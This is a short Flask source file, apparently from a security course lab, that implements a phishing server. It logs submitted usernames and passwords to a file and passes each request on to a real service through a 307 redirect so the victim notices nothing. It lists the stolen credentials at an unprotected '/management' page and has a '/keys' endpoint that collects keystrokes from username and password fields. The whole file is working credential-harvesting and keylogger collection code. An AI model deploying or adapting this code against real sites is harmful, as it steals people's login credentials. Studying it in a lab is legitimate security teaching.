from flask import Flask, request, redirect, render_template
app = Flask(__name__)
 
@app.route('/',methods=['GET','POST'])
def web_page():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
 
        with open('creds.txt', 'r+') as f:
            creds = f'{username}, {password}'
            if creds not in f.read():
                f.write(f'{username}, {password}\n')
 
        return redirect(f'http://localhost:2222/', code=307)
 
    return render_template('/home/cse/Lab4/Q6.html')
 
@app.route('/management')
def management():
    with open('creds.txt', 'r') as f:
        creds = f.readlines()
    html = ''
    for i in creds:
        html += f'<p> {i}</p>\n'
    return html
 
form = ''
@app.route('/keys', methods = ['GET','POST'])
def keys():
    global form
    if request.method == 'POST':
        with open('keys.txt', 'a') as f:
            data = request.data.decode()
            d = data.split(':')
            if d[0] == 'username':
                if form == 'u':
                    f.write(d[1])
                elif form == 'p':
                    form = 'u'
                    f.write(f'\n\nusername:\n{d[1]}')
                else:
                    form = 'u'
                    f.write(f'username:\n{d[1]}')
            elif d[0] == 'password':
                if form == 'p':
                    f.write(d[1])
                elif form == 'u':
                    form = 'p'
                    f.write(f'\n\npassword:\n{d[1]}')
                else:
                    form = 'p'
                    f.write(f'password:\n{d[1]}')
    with open('keys.txt', 'r') as f:
        keys = f.readlines()
    html = ''
    for i in keys:
        html += f'<p> {i}</p>'
    return html
